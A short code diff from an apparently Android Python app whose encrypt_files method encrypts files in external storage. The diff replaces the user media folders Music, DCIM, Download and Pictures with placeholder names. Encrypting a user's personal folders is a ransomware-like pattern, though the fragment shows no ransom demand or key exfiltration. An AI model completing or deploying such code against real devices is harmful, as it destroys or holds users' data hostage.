@@ -36,7 +36,7 @@ class MyApp(App):
             encrypted_file.write(encrypted)
 
     def encrypt_files(self, instance):
-        directories = ['Music', 'Dcim', 'Download', 'Pictures']
+        directories = ['Mouton', 'Cabri', 'rido', 'caca']
         base_path = primary_external_storage_path()
 
         key = self.generate_key()  # Generate the specified key
